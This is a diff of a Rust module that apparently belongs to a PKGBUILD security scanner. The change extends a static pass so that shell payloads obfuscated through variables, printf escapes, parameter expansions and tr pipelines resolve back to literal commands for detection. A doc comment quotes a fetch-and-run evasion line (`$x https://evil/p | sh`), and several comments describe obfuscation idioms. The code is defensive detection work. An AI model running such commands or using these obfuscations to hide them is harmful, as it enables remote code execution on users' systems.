@@ -1,7 +1,7 @@
 //! Intra-PKGBUILD variable resolution (a lightweight, static taint pass).
 //!
 //! The detectors match shell text token-by-token, so a payload hidden behind a
-//! shell variable evades every rule -- the rc1 SECURITY-AUDIT finding **HI-6**:
+//! shell variable evades every rule:
 //! `x=curl; $x https://evil/p | sh` and `c=$(printf '\x63url'); $c …` "trip
 //! nothing." There is no dataflow.
 //!
@@ -33,7 +33,7 @@
 //! * Resolution is single-pass and flow-ordered: a use resolves to the most
 //!   recent prior assignment, matching shell evaluation order.
 
-use std::collections::HashMap;
+use std::collections::{HashMap, HashSet};
 use std::sync::LazyLock;
 
 use regex::Regex;
@@ -96,7 +96,7 @@ fn is_build_var(name: &str) -> bool {
 /// anchoring at the start; `export`/`local`/`declare`/`readonly` prefixes are
 /// stripped by [`strip_decl_prefix`] before matching.
 static ASSIGN_RE: LazyLock<Regex> =
-    LazyLock::new(|| Regex::new(r"^([A-Za-z_][A-Za-z0-9_]*)=(.*)$").unwrap());
+    LazyLock::new(|| Regex::new(r"^([A-Za-z_][A-Za-z0-9_]*)(\+?)=(.*)$").unwrap());
 
 /// A `$(printf 'FMT' …)` or `` `printf 'FMT'` `` command substitution whose
 /// format is a single-quoted (or unquoted) constant. Captures the format string.
@@ -212,7 +212,11 @@ fn decode_printf_format(fmt: &str) -> String {
 /// if it is not statically evident (references an unknown command-substitution, a
 /// still-unresolved variable, etc.). `vars` is the map of already-resolved
 /// variables so chained constant assignments (`a=cur; b=${a}l`) resolve.
-fn resolve_rhs(rhs: &str, vars: &HashMap<String, String>) -> Option<String> {
+fn resolve_rhs(
+    rhs: &str,
+    vars: &HashMap<String, String>,
+    unset: &HashSet<String>,
+) -> Option<String> {
     let rhs = rhs.trim();
     if rhs.is_empty() {
         return Some(String::new());
@@ -223,59 +227,629 @@ fn resolve_rhs(rhs: &str, vars: &HashMap<String, String>) -> Option<String> {
         let decoded = decode_printf_format(fmt);
         return (decoded.len() <= MAX_VALUE_LEN).then_some(decoded);
     }
+    // Substitute any already-known variables (and fold the constant command
+    // substitutions we understand), then strip the quoting the shell would (so
+    // `"cu""rl"`, `$'\x63'url`, `'curl'` all fold to the literal word).
+    let substituted = substitute_vars(rhs, vars, unset);
     // Any other command substitution / backtick is not statically resolvable.
-    if rhs.contains("$(") || rhs.contains('`') {
+    if substituted.contains("$(") || substituted.contains('`') {
         return None;
     }
-    // Substitute any already-known variables, then strip the quoting the shell
-    // would (so `"cu""rl"`, `$'\x63'url`, `'curl'` all fold to the literal word).
-    let substituted = substitute_vars(rhs, vars);
+    let normalized = normalize_shell_quoting(&substituted);
     // If a `$`-expansion of an UNKNOWN variable remains, the value is not fully
     // static -- refuse rather than emit a half-resolved token.
-    let normalized = normalize_shell_quoting(&substituted);
     if normalized.contains('$') {
         return None;
     }
     (normalized.len() <= MAX_VALUE_LEN).then_some(normalized)
 }
 
-/// Matches a variable use: `$name`, `${name}`, `${!name}` (indirect),
-/// `${name[@]}` / `${name[*]}` (whole array) and `${name[0]}`. The captured name
-/// is a full identifier so `$vx` is not a use of `$v`.
+/// Matches a variable use. Braced forms capture an optional `!`/`#` prefix, the
+/// name, an optional `[subscript]` and whatever operator text follows up to the
+/// first `}` (`${x:1:3}`, `${x//a/b}`, `${x:-d}`); the rest are `$name`, the
+/// positional `${1}`/`$1` and `$@`/`$*`. The captured name is a full identifier
+/// so `$vx` is not a use of `$v`.
 static USE_RE: LazyLock<Regex> = LazyLock::new(|| {
     Regex::new(
-        r"\$\{!([A-Za-z_][A-Za-z0-9_]*)\}|\$\{([A-Za-z_][A-Za-z0-9_]*)\[[@*]\]\}|\$\{([A-Za-z_][A-Za-z0-9_]*)(?:\[0\])?\}|\$([A-Za-z_][A-Za-z0-9_]*)",
+        r"\$\{([!#]?)([A-Za-z_][A-Za-z0-9_]*)(?:\[([^\]]*)\])?([^}]*)\}|\$\{([0-9]+|[@*])\}|\$([A-Za-z_][A-Za-z0-9_]*)|\$([0-9@*])",
     )
     .unwrap()
 });
 
-/// Replace every resolvable `$v` / `${v}` / `${!v}` / `${v[@]}` in `line` with
-/// its value from `vars`. Unknown variables are left verbatim. `${!v}` is one
-/// extra hop: the value of `v` is itself treated as a variable name and resolved
-/// again.
-fn substitute_vars(line: &str, vars: &HashMap<String, String>) -> String {
-    USE_RE
-        .replace_all(line, |caps: &regex::Captures| {
-            if let Some(ind) = caps.get(1) {
-                // ${!name}: resolve name -> inner var name -> its value.
-                return vars
-                    .get(ind.as_str())
-                    .and_then(|inner| vars.get(inner))
-                    .cloned()
-                    .unwrap_or_else(|| caps[0].to_string());
+/// Key under which `IFS` is tracked. A plain `IFS` key would be substituted by
+/// the `$IFS` use handling, so it lives under a name no script can spell.
+const IFS_KEY: &str = "\u{0}IFS";
+/// Prefix of the alias table inside the variable map.
+const ALIAS_PREFIX: &str = "\u{0}alias:";
+
+/// How far from its opener `fold_substitutions` looks for a substitution's
+/// closer (bodies longer than [`MAX_ENCODED_LEN`] are never folded anyway), and
+/// the total scan steps it may spend on one line.
+const FOLD_WINDOW: usize = MAX_ENCODED_LEN + 2;
+const FOLD_WORK_BUDGET: usize = 64 * 1024;
+
+/// Most array elements we track individually.
+const MAX_ARRAY_ELEMS: usize = 32;
+
+/// Names that appear in `content` only as `$name` / `${name…}` uses and never
+/// anywhere else (no `name=`, `read name`, `for name`, `printf -v name`, …), and
+/// that are not build/env style names. A use of such a variable expands to the
+/// empty string, so `n${zz}pm` is `npm`.
+fn unset_names(content: &str) -> HashSet<String> {
+    static IDENT_RE: LazyLock<Regex> =
+        LazyLock::new(|| Regex::new(r"[A-Za-z_][A-Za-z0-9_]*").unwrap());
+    let bytes = content.as_bytes();
+    let mut elsewhere: HashSet<&str> = HashSet::new();
+    let mut used: HashSet<&str> = HashSet::new();
+    for m in IDENT_RE.find_iter(content) {
+        let s = m.start();
+        let prev = if s > 0 { bytes[s - 1] } else { 0 };
+        let is_use = prev == b'$'
+            || (prev == b'{' && s > 1 && bytes[s - 2] == b'$')
+            || (matches!(prev, b'!' | b'#')
+                && s > 2
+                && bytes[s - 2] == b'{'
+                && bytes[s - 3] == b'$');
+        if is_use {
+            used.insert(m.as_str());
+        } else {
+            elsewhere.insert(m.as_str());
+        }
+    }
+    used.into_iter()
+        .filter(|n| !elsewhere.contains(n) && !is_build_var(n))
+        .map(str::to_string)
+        .collect()
+}
+
+/// Expand a character class-free shell glob (`*`, `?`, literals) into an
+/// anchored-by-the-caller regex. `[...]` classes are not modelled: `None`.
+fn glob_to_regex(pat: &str) -> Option<Regex> {
+    let mut re = String::new();
+    for c in pat.chars() {
+        match c {
+            '*' => re.push_str(".*"),
+            '?' => re.push('.'),
+            '[' | ']' => return None,
+            c => re.push_str(&regex::escape(&c.to_string())),
+        }
+    }
+    Regex::new(&re).ok()
+}
+
+/// Apply `${v#p}`, `${v##p}`, `${v%p}`, `${v%%p}`.
+fn strip_affix(v: &str, pat: &str, prefix: bool, longest: bool) -> Option<String> {
+    let re = glob_to_regex(pat)?;
+    let full = Regex::new(&format!("^(?:{})$", re.as_str())).ok()?;
+    let cuts: Vec<usize> = v
+        .char_indices()
+        .map(|(i, _)| i)
+        .chain(std::iter::once(v.len()))
+        .collect();
+    if prefix {
+        let order: Box<dyn Iterator<Item = &usize>> = if longest {
+            Box::new(cuts.iter().rev())
+        } else {
+            Box::new(cuts.iter())
+        };
+        for &k in order {
+            if full.is_match(&v[..k]) {
+                return Some(v[k..].to_string());
             }
-            if let Some(arr) = caps.get(2) {
-                return vars
-                    .get(&format!("{}[@]", arr.as_str()))
-                    .cloned()
-                    .unwrap_or_else(|| caps[0].to_string());
+        }
+    } else {
+        let order: Box<dyn Iterator<Item = &usize>> = if longest {
+            Box::new(cuts.iter())
+        } else {
+            Box::new(cuts.iter().rev())
+        };
+        for &k in order {
+            if full.is_match(&v[k..]) {
+                return Some(v[..k].to_string());
             }
-            let name = caps.get(3).or_else(|| caps.get(4)).unwrap().as_str();
-            vars.get(name)
+        }
+    }
+    Some(v.to_string())
+}
+
+/// `${v:off}` / `${v:off:len}` over characters, with bash's negative-offset and
+/// negative-length rules.
+fn substring(v: &str, spec: &str) -> Option<String> {
+    let chars: Vec<char> = v.chars().collect();
+    // i128 holds any i64 sum, so no operand can overflow.
+    let n = chars.len() as i128;
+    let (off_s, len_s) = match spec.split_once(':') {
+        Some((o, l)) => (o, Some(l)),
+        None => (spec, None),
+    };
+    let off = i128::from(off_s.trim().parse::<i64>().ok()?);
+    let start = if off < 0 {
+        (n + off).max(0)
+    } else {
+        off.min(n)
+    };
+    let end = match len_s {
+        None => n,
+        Some(l) => {
+            let l = i128::from(l.trim().parse::<i64>().ok()?);
+            if l < 0 {
+                (n + l).max(start)
+            } else {
+                (start + l).min(n)
+            }
+        }
+    }
+    .clamp(start, n);
+    Some(chars[start as usize..end as usize].iter().collect())
+}
+
+/// Split `a/b` on the first unescaped `/`.
+fn split_replace(spec: &str) -> (String, String) {
+    let mut pat = String::new();
+    let mut it = spec.chars().peekable();
+    while let Some(c) = it.next() {
+        if c == '\\' {
+            if let Some(n) = it.next() {
+                pat.push(n);
+            }
+        } else if c == '/' {
+            return (pat, it.collect());
+        } else {
+            pat.push(c);
+        }
+    }
+    (pat, String::new())
+}
+
+/// Evaluate a braced parameter expansion with an operator against a known (or
+/// known-empty) value. `None` when the operator is not modelled.
+fn apply_operator(
+    val: Option<String>,
+    op: &str,
+    vars: &HashMap<String, String>,
+    unset: &HashSet<String>,
+    _known_unset: bool,
+) -> Option<String> {
+    // Operator arguments may themselves be quoted / carry variables.
+    let arg = |raw: &str| -> Option<String> {
+        // Plain `$name` uses only: a nested `${…}` / `$(…)` argument would
+        // recurse (`${a:-${a:-…}}`, thousands deep) for no gain.
+        if raw.contains("${") || raw.contains("$(") || raw.contains('`') {
+            return None;
+        }
+        let s = normalize_shell_quoting(&substitute_vars(raw, vars, unset));
+        (!s.contains('$') && !s.contains('`')).then_some(s)
+    };
+    let is_set = val.is_some();
+    let v = val.unwrap_or_default();
+    if let Some(d) = op.strip_prefix(":-").or_else(|| op.strip_prefix(":=")) {
+        return if v.is_empty() { arg(d) } else { Some(v) };
+    }
+    if let Some(d) = op.strip_prefix('-').or_else(|| op.strip_prefix('=')) {
+        return if is_set { Some(v) } else { arg(d) };
+    }
+    if let Some(d) = op.strip_prefix(":+") {
+        return if v.is_empty() {
+            Some(String::new())
+        } else {
+            arg(d)
+        };
+    }
+    if let Some(spec) = op.strip_prefix("//") {
+        let (pat, rep) = split_replace(spec);
+        if pat.is_empty() {
+            return Some(v);
+        }
+        let re = glob_to_regex(&arg(&pat)?)?;
+        let rep = arg(&rep)?;
+        return Some(re.replace_all(&v, regex::NoExpand(&rep)).into_owned());
+    }
+    if let Some(spec) = op.strip_prefix('/') {
+        if spec.starts_with(['#', '%']) {
+            return None;
+        }
+        let (pat, rep) = split_replace(spec);
+        if pat.is_empty() {
+            return Some(v);
+        }
+        let re = glob_to_regex(&arg(&pat)?)?;
+        let rep = arg(&rep)?;
+        return Some(re.replacen(&v, 1, regex::NoExpand(&rep)).into_owned());
+    }
+    if let Some(p) = op.strip_prefix("##") {
+        return strip_affix(&v, &arg(p)?, true, true);
+    }
+    if let Some(p) = op.strip_prefix('#') {
+        return strip_affix(&v, &arg(p)?, true, false);
+    }
+    if let Some(p) = op.strip_prefix("%%") {
+        return strip_affix(&v, &arg(p)?, false, true);
+    }
+    if let Some(p) = op.strip_prefix('%') {
+        return strip_affix(&v, &arg(p)?, false, false);
+    }
+    match op {
+        ",," => return Some(v.to_lowercase()),
+        "^^" => return Some(v.to_uppercase()),
+        "," | "^" => {
+            let mut cs = v.chars();
+            let first = cs.next();
+            let head = first.map(|c| {
+                if op == "," {
+                    c.to_lowercase().to_string()
+                } else {
+                    c.to_uppercase().to_string()
+                }
+            });
+            return Some(head.unwrap_or_default() + cs.as_str());
+        }
+        _ => {}
+    }
+    if let Some(spec) = op.strip_prefix(':') {
+        return substring(&v, spec);
+    }
+    None
+}
+
+/// Look up `name` (optionally subscripted) in the tracked variables.
+fn lookup_var(vars: &HashMap<String, String>, name: &str, idx: Option<&str>) -> Option<String> {
+    match idx {
+        None => vars.get(name).cloned(),
+        Some("@") => vars.get(&format!("{name}[@]")).cloned(),
+        Some("*") => {
+            if vars.get(IFS_KEY).is_some_and(String::is_empty) {
+                let n: usize = vars.get(&format!("{name}[#]"))?.parse().ok()?;
+                (0..n)
+                    .map(|i| vars.get(&format!("{name}[{i}]")).cloned())
+                    .collect::<Option<Vec<_>>>()
+                    .map(|e| e.concat())
+            } else {
+                vars.get(&format!("{name}[@]")).cloned()
+            }
+        }
+        Some(i) if i.chars().all(|c| c.is_ascii_digit()) && !i.is_empty() => {
+            vars.get(&format!("{name}[{i}]")).cloned()
+        }
+        Some(_) => None,
+    }
+}
+
+/// True when the character just before `start`, or just after `end`, belongs to
+/// the same shell word as the expansion (a letter, digit or `_`).
+fn glued_to_word(line: &str, start: usize, end: usize) -> bool {
+    let word = |c: char| c.is_ascii_alphanumeric() || c == '_';
+    // A quote pair around the expansion does not end the word: `n"$zz"pm`.
+    let before = &line[..start];
+    let before = before.strip_suffix(['"', '\'']).unwrap_or(before);
+    let after = &line[end..];
+    let after = after.strip_prefix(['"', '\'']).unwrap_or(after);
+    before.chars().next_back().is_some_and(word) || after.chars().next().is_some_and(word)
+}
+
+/// Replace every resolvable `$v` / `${v}` / `${!v}` / `${v[@]}` / `${v[N]}` /
+/// `${v<operator>…}` in `line` with its value from `vars`, then fold the
+/// constant command substitutions we understand. Unknown variables are left
+/// verbatim, except a variable that is never assigned anywhere in the package
+/// (`unset`) used INSIDE a word, which expands to nothing (`n${zz}pm`). `${!v}`
+/// is one extra hop: the value of `v` is itself treated as a variable name.
+fn substitute_vars(line: &str, vars: &HashMap<String, String>, unset: &HashSet<String>) -> String {
+    let replaced = USE_RE.replace_all(line, |caps: &regex::Captures| {
+        let whole = caps.get(0).unwrap();
+        let verbatim = || whole.as_str().to_string();
+        // Positional parameters and `$@`/`$*`.
+        if let Some(p) = caps.get(5).or_else(|| caps.get(7)) {
+            return vars.get(p.as_str()).cloned().unwrap_or_else(verbatim);
+        }
+        // Plain `$name`.
+        if let Some(n) = caps.get(6) {
+            let name = n.as_str();
+            return match vars.get(name) {
+                Some(v) => v.clone(),
+                None if unset.contains(name) && glued_to_word(line, whole.start(), whole.end()) => {
+                    String::new()
+                }
+                None => verbatim(),
+            };
+        }
+        let prefix = &caps[1];
+        let name = &caps[2];
+        let idx = caps.get(3).map(|m| m.as_str());
+        let op = &caps[4];
+        if prefix == "#" {
+            return verbatim();
+        }
+        if prefix == "!" {
+            // ${!name}: resolve name -> inner var name -> its value.
+            if idx.is_some() || !op.is_empty() {
+                return verbatim();
+            }
+            return vars
+                .get(name)
+                .and_then(|inner| vars.get(inner))
                 .cloned()
-                .unwrap_or_else(|| caps[0].to_string())
-        })
-        .into_owned()
+                .unwrap_or_else(verbatim);
+        }
+        let val = lookup_var(vars, name, idx);
+        let known_unset =
+            val.is_none() && idx.is_none() && unset.contains(name) && !vars.contains_key(name);
+        if op.is_empty() {
+            return match val {
+                Some(v) => v,
+                None if known_unset && glued_to_word(line, whole.start(), whole.end()) => {
+                    String::new()
+                }
+                None => verbatim(),
+            };
+        }
+        if val.is_none() && !known_unset {
+            return verbatim();
+        }
+        match apply_operator(val, op, vars, unset, known_unset) {
+            Some(v) if v.len() <= MAX_VALUE_LEN => v,
+            _ => verbatim(),
+        }
+    });
+    fold_substitutions(&replaced)
+}
+
+/// Argument words of a simple command, quote-normalized.
+fn norm_words(words: &[String]) -> Vec<String> {
+    words.iter().map(|w| normalize_shell_quoting(w)).collect()
+}
+
+/// `printf FMT [ARG…]` evaluated purely: backslash escapes decoded, `%s`/`%b`
+/// filled from the arguments, `%%` collapsed. Any other directive: `None`.
+fn fold_printf(words: &[String]) -> Option<String> {
+    let mut i = 1;
+    if words.get(i).map(String::as_str) == Some("--") {
+        i += 1;
+    }
+    let raw_fmt = words.get(i)?;
+    let fmt = if let Some(inner) = raw_fmt
+        .strip_prefix('\'')
+        .and_then(|r| r.strip_suffix('\''))
+        .or_else(|| raw_fmt.strip_prefix('"').and_then(|r| r.strip_suffix('"')))
+    {
+        inner.to_string()
+    } else {
+        raw_fmt.clone()
+    };
+    let args = norm_words(&words[i + 1..]);
+    let decoded = decode_printf_format(&fmt);
+    let slots = decoded.matches("%s").count() + decoded.matches("%b").count();
+    // Only `%s`, `%b` and `%%` directives are modelled.
+    if decoded.replace("%%", "").matches('%').count() != slots
+        || args.len() > slots.max(1) && slots > 0
+    {
+        return None;
+    }
+    let mut out = String::new();
+    let mut arg_it = args.iter();
+    let cs: Vec<char> = decoded.chars().collect();
+    let mut k = 0;
+    while k < cs.len() {
+        if cs[k] == '%' {
+            match cs.get(k + 1) {
+                Some('%') => out.push('%'),
+                Some('s') | Some('b') => {
+                    out.push_str(arg_it.next().map(String::as_str).unwrap_or(""))
+                }
+                _ => return None,
+            }
+            k += 2;
+        } else {
+            out.push(cs[k]);
+            k += 1;
+        }
+    }
+    (out.len() <= MAX_VALUE_LEN).then_some(out)
+}
+
+/// Expand `a-z` style ranges of a `tr` set.
+fn tr_set(spec: &str) -> Option<Vec<char>> {
+    let cs: Vec<char> = spec.chars().collect();
+    let mut out = Vec::new();
+    let mut i = 0;
+    while i < cs.len() {
+        if cs[i] == '[' || cs[i] == '\\' {
+            return None;
+        }
+        if i + 2 < cs.len() && cs[i + 1] == '-' {
+            let (a, b) = (cs[i] as u32, cs[i + 2] as u32);
+            if a > b || b - a > 256 {
+                return None;
+            }
+            out.extend((a..=b).filter_map(char::from_u32));
+            i += 3;
+        } else {
+            out.push(cs[i]);
+            i += 1;
+        }
+    }
+    Some(out)
+}
+
+/// `tr SET1 SET2` / `tr -d SET` over `input`.
+fn fold_tr(args: &[String], input: &str) -> Option<String> {
+    let args = norm_words(args);
+    match args.as_slice() {
+        [d, set] if d == "-d" => {
+            let set = tr_set(set)?;
+            Some(input.chars().filter(|c| !set.contains(c)).collect())
+        }
+        [s1, s2] if !s1.starts_with('-') => {
+            let (s1, s2) = (tr_set(s1)?, tr_set(s2)?);
+            let last = *s2.last()?;
+            Some(
+                input
+                    .chars()
+                    .map(|c| match s1.iter().position(|x| *x == c) {
+                        Some(p) => *s2.get(p).unwrap_or(&last),
+                        None => c,
+                    })
+                    .collect(),
+            )
+        }
+        _ => None,
+    }
+}
+
+/// The text a command substitution body prints, for the shapes that can be
+/// evaluated without running anything: `printf …`, `echo …`, optionally piped
+/// through `tr`. `None` for everything else.
+fn fold_command(body: &str) -> Option<String> {
+    let body = body.trim();
+    if body.len() > MAX_ENCODED_LEN || body.contains(['\n', ';', '&', '>']) {
+        return None;
+    }
+    // Split the (single) pipeline on top-level `|`.
+    let stages = split_pipeline(body)?;
+    let mut text = fold_producer(split_words(stages.first()?).as_slice())?;
+    for stage in &stages[1..] {
+        let w = split_words(stage);
+        if w.first().map(String::as_str) != Some("tr") {
+            return None;
+        }
+        // `tr A B <<< word` supplies its own input.
+        let (args, here) = match w.iter().position(|x| x == "<<<") {
+            Some(p) => (&w[1..p], Some(norm_words(&w[p + 1..]).join(" "))),
+            None => (&w[1..], None),
+        };
+        text = fold_tr(args, here.as_deref().unwrap_or(&text))?;
+    }
+    (text.len() <= MAX_VALUE_LEN).then_some(text)
+}
+
+/// First stage of a substitution: `echo`/`printf`, or `tr` with `<<<` input.
+fn fold_producer(words: &[String]) -> Option<String> {
+    match words.first().map(String::as_str)? {
+        "printf" => fold_printf(words),
+        "echo" => {
+            let mut rest = &words[1..];
+            while rest.first().is_some_and(|w| w == "-n") {
+                rest = &rest[1..];
+            }
+            if rest.first().is_some_and(|w| w.starts_with('-')) {
+                return None;
+            }
+            Some(norm_words(rest).join(" "))
+        }
+        "tr" => {
+            let p = words.iter().position(|x| x == "<<<")?;
+            let input = norm_words(&words[p + 1..]).join(" ");
+            fold_tr(&words[1..p], &input)
+        }
+        _ => None,
+    }
+}
+
+/// Split on `|` outside quotes; `None` on `||` or anything exotic.
+fn split_pipeline(body: &str) -> Option<Vec<String>> {
+    let mut out = vec![String::new()];
+    let (mut sq, mut dq) = (false, false);
+    let cs: Vec<char> = body.chars().collect();
+    let mut i = 0;
+    while i < cs.len() {
+        let c = cs[i];
+        match c {
+            '\'' if !dq => sq = !sq,
+            '"' if !sq => dq = !dq,
+            '$' | '`' if !sq => return None,
+            '|' if !sq && !dq => {
+                if cs.get(i + 1) == Some(&'|') {
+                    return None;
+                }
+                out.push(String::new());
+                i += 1;
+                continue;
+            }
+            _ => {}
+        }
+        out.last_mut()?.push(c);
+        i += 1;
+    }
+    Some(out)
+}
+
+/// Replace `$( … )` and `` `…` `` substitutions we can evaluate statically with
+/// the text they print. Only used where the result is free of quote/escape
+/// characters, so splicing it cannot change how the surrounding line parses.
+fn fold_substitutions(line: &str) -> String {
+    if !line.contains("$(") && !line.contains('`') {
+        return line.to_string();
+    }
+    let cs: Vec<char> = line.chars().collect();
+    let mut out = String::with_capacity(line.len());
+    let mut i = 0;
+    let (mut sq, mut dq) = (false, false);
+    // Work budget: each candidate looks for its closer inside a bounded window,
+    // and the scan steps of the whole line are capped. Nested `$($($(…` would
+    // otherwise rescan the rest of the line from every opener (quadratic). Past
+    // the budget the remainder is kept verbatim: this is an extra variant, so
+    // stopping early can only lose a fold, never hide anything.
+    let mut budget = FOLD_WORK_BUDGET;
+    while i < cs.len() {
+        if budget == 0 {
+            out.extend(&cs[i..]);
+            break;
+        }
+        let c = cs[i];
+        // Quote state: a `'` inside "…" (or a `"` inside '…') is literal, and a
+        // backslash outside single quotes escapes the next character.
+        if c == '\\' && !sq && i + 1 < cs.len() {
+            out.push(c);
+            out.push(cs[i + 1]);
+            i += 2;
+            continue;
+        }
+        if c == '\'' && !dq {
+            sq = !sq;
+        } else if c == '"' && !sq {
+            dq = !dq;
+        }
+        let close = if sq {
+            None
+        } else if c == '$' && cs.get(i + 1) == Some(&'(') && cs.get(i + 2) != Some(&'(') {
+            let mut depth = 1;
+            let mut j = i + 2;
+            let limit = (i + 2 + FOLD_WINDOW).min(cs.len());
+            let (mut isq, mut idq) = (false, false);
+            while j < limit && depth > 0 {
+                budget = budget.saturating_sub(1);
+                match cs[j] {
+                    '\'' if !idq => isq = !isq,
+                    '"' if !isq => idq = !idq,
+                    '(' if !isq && !idq => depth += 1,
+                    ')' if !isq && !idq => depth -= 1,
+                    _ => {}
+                }
+                j += 1;
+            }
+            (depth == 0).then_some((i + 2, j - 1, j))
+        } else if c == '`' {
+            let limit = (i + 1 + FOLD_WINDOW).min(cs.len());
+            budget = budget.saturating_sub(limit - i);
+            cs[i + 1..limit]
+                .iter()
+                .position(|&x| x == '`')
+                .map(|p| (i + 1, i + 1 + p, i + 2 + p))
+        } else {
+            None
+        };
+        if let Some((bs, be, next)) = close {
+            let body: String = cs[bs..be].iter().collect();
+            if let Some(v) = fold_command(&body) {
+                if !v.contains(['\'', '"', '\\', '$', '`', '\n']) {
+                    out.push_str(&v);
+                    i = next;
+                    continue;
+                }
+            }
+        }
+        out.push(c);
+        i += 1;
+    }
+    out
 }
 
 /// `${IFS}` / `$IFS` / `${IFS%?}` / `$IFS$9` used as a word separator: the shell
@@ -376,6 +950,11 @@ fn decode_hex(lit: &str) -> Option<String> {
 /// Purely static, size-bounded, and run at most two levels deep. Returns `None`
 /// when nothing decoded.
 fn decode_inline_payloads(line: &str) -> Option<String> {
+    // Every decoder needs one of these words; most lines have none, and the
+    // regexes below are comparatively costly.
+    if !["base64", "xxd", "printf"].iter().any(|k| line.contains(k)) {
+        return None;
+    }
     let mut cur = line.to_string();
     let mut changed = false;
     for _ in 0..2 {
@@ -444,33 +1023,113 @@ pub(crate) fn statement_head(stmt: &str) -> (&str, bool) {
     (stripped, stripped.len() != s.len())
 }
 
-struct Scope {
+/// Matches the start of a function definition statement and captures its name.
+static FN_NAME_RE: LazyLock<Regex> = LazyLock::new(|| {
+    Regex::new(r"^\s*(?:function\s+)?([A-Za-z_][A-Za-z0-9_:-]*)\s*\(\s*\)|^\s*function\s+([A-Za-z_][A-Za-z0-9_:-]*)")
+        .unwrap()
+});
+
+/// Most distinct call sites of one helper function we resolve its positional
+/// parameters for.
+const MAX_CALL_VARIANTS: usize = 4;
+
+/// What a first pass learns about the file.
+#[derive(Default)]
+struct PassFacts {
+    /// Top-level variables at end of file.
+    globals: HashMap<String, String>,
+    /// Variables assigned inside functions without `local`: they become global
+    /// once the function runs, which we cannot order, so they are only offered
+    /// to a second pass.
+    leaks: HashMap<String, String>,
+    /// Literal-argument call sites of the functions defined in the file.
+    calls: HashMap<String, Vec<Vec<Option<String>>>>,
+}
+
+struct Scope<'a> {
     /// Effective variables at this point (globals overlaid by function locals).
     vars: HashMap<String, String>,
     /// Top-level (global) variables only.
     globals: HashMap<String, String>,
     in_func: bool,
+    /// Names declared `local` in the current function.
+    locals: HashSet<String>,
+    /// Non-local assignments made inside functions.
+    leaks: HashMap<String, String>,
+    /// Names never assigned anywhere in the package files.
+    unset: &'a HashSet<String>,
 }
 
-impl Scope {
+fn base_name(key: &str) -> &str {
+    key.split('[').next().unwrap_or(key)
+}
+
+impl Scope<'_> {
     fn set(&mut self, name: &str, val: String) {
         if !self.in_func {
             self.globals.insert(name.to_string(), val.clone());
+        } else if !self.locals.contains(base_name(name)) {
+            self.leaks.insert(name.to_string(), val.clone());
         }
         self.vars.insert(name.to_string(), val);
     }
 
     fn forget(&mut self, name: &str) {
-        for k in [name.to_string(), format!("{name}[@]")] {
+        let prefix = format!("{name}[");
+        let keys: Vec<String> = self
+            .vars
+            .keys()
+            .chain(self.globals.keys())
+            .filter(|k| k.as_str() == name || k.starts_with(&prefix))
+            .cloned()
+            .collect();
+        for k in keys {
             if !self.in_func {
                 self.globals.remove(&k);
             }
             self.vars.remove(&k);
+            self.leaks.remove(&k);
         }
     }
 
-    /// Record one `name=value` assignment (value still raw shell text).
-    fn assign(&mut self, name: &str, rhs: &str) {
+    /// Store an array: first element as `$name`, the whole list as
+    /// `${name[@]}`, each element as `${name[i]}`.
+    fn set_array(&mut self, name: &str, elems: &[String]) {
+        self.forget(name);
+        let joined = elems.join(" ");
+        if joined.len() > MAX_VALUE_LEN || elems.len() > MAX_ARRAY_ELEMS {
+            return;
+        }
+        self.set(name, elems.first().cloned().unwrap_or_default());
+        self.set(&format!("{name}[@]"), joined);
+        self.set(&format!("{name}[#]"), elems.len().to_string());
+        for (i, e) in elems.iter().enumerate() {
+            self.set(&format!("{name}[{i}]"), e.clone());
+        }
+    }
+
+    /// Current elements of array `name`, when fully tracked.
+    fn array_elems(&self, name: &str) -> Option<Vec<String>> {
+        let n: usize = self.vars.get(&format!("{name}[#]"))?.parse().ok()?;
+        (0..n)
+            .map(|i| self.vars.get(&format!("{name}[{i}]")).cloned())
+            .collect()
+    }
+
+    fn rhs(&self, raw: &str) -> Option<String> {
+        resolve_rhs(raw, &self.vars, self.unset)
+    }
+
+    /// Record one `name=value` / `name+=value` assignment (value still raw
+    /// shell text).
+    fn assign(&mut self, name: &str, rhs: &str, append: bool) {
+        if name == "IFS" {
+            match self.rhs(rhs) {
+                Some(v) => self.set(IFS_KEY, v),
+                None => self.forget(IFS_KEY),
+            }
+            return;
+        }
         if is_build_var(name) {
             return;
         }
@@ -482,29 +1141,141 @@ impl Scope {
                 self.forget(name);
                 return;
             };
-            let elems: Option<Vec<String>> = split_words(inner)
-                .iter()
-                .map(|w| resolve_rhs(w, &self.vars))
-                .collect();
+            let elems: Option<Vec<String>> =
+                split_words(inner).iter().map(|w| self.rhs(w)).collect();
             match elems {
-                Some(e) => {
-                    let joined = e.join(" ");
-                    if joined.len() > MAX_VALUE_LEN {
-                        self.forget(name);
-                        return;
+                Some(mut e) => {
+                    if append {
+                        match self.array_elems(name) {
+                            Some(mut old) => {
+                                old.append(&mut e);
+                                e = old;
+                            }
+                            None => {
+                                self.forget(name);
+                                return;
+                            }
+                        }
                     }
-                    self.set(name, e.first().cloned().unwrap_or_default());
-                    self.set(&format!("{name}[@]"), joined);
+                    self.set_array(name, &e);
                 }
                 None => self.forget(name),
             }
             return;
         }
-        match resolve_rhs(rhs, &self.vars) {
-            Some(v) => self.set(name, v),
+        let Some(v) = self.rhs(rhs) else {
             // Unresolvable RHS: forget any stale value so a later use is not
             // resolved to an outdated constant (fail toward raw).
-            None => self.forget(name),
+            self.forget(name);
+            return;
+        };
+        if append {
+            // `c+=pm` extends the old value; an unassigned name starts empty.
+            let old = match self.vars.get(name) {
+                Some(o) => o.clone(),
+                None if self.unset.contains(name) => String::new(),
+                None => {
+                    self.forget(name);
+                    return;
+                }
+            };
+            let joined = format!("{old}{v}");
+            if joined.len() > MAX_VALUE_LEN {
+                self.forget(name);
+            } else {
+                self.set(name, joined);
+            }
+        } else {
+            self.set(name, v);
+        }
+    }
+
+    /// `printf -v NAME FMT ARG…`, `read [-r] NAME… <<< text`,
+    /// `mapfile|readarray [-t] NAME <<< text` and `alias NAME=VALUE`.
+    /// Returns true when the statement was one of those (it is not an
+    /// assignment list).
+    fn track_builtin(&mut self, words: &[String]) -> bool {
+        let Some(cmd) = words.first().map(String::as_str) else {
+            return false;
+        };
+        match cmd {
+            "printf" if words.get(1).map(String::as_str) == Some("-v") => {
+                let Some(name) = words.get(2) else {
+                    return true;
+                };
+                let mut synth = vec!["printf".to_string()];
+                synth.extend(words[3..].iter().cloned());
+                match fold_printf(&synth) {
+                    Some(v) => self.assign(name, &format!("'{}'", v.replace('\'', "")), false),
+                    None => self.forget(name),
+                }
+                true
+            }
+            "read" | "mapfile" | "readarray" => {
